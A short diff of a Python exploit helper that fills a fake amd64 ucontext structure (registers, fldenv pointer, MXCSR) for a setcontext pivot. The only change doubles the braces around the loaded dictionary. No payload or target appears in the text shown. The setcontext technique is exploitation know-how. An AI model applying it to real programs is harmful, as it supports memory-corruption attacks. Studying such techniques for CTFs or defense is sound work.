@@ -41,7 +41,7 @@ def setcontext:
 
 def exploit(*args, **kwargs):
     uc = UContext("amd64")
-    uc.load({
+    uc.load({{
         "R8":  0,		# 0x28
         "R9":  0,		# 0x30
         "R12": 0,		# 0x48
@@ -60,7 +60,7 @@ def exploit(*args, **kwargs):
         # floating point stuff
         "FPREGS": 0x404000,    	# 0xB0: fldenv pointer
         "MXCSR":  0x1F80,      	# 0x1C0: default safe SSE state
-    })
+    }})
     uc.dump()
     blob = uc.bytes   
    
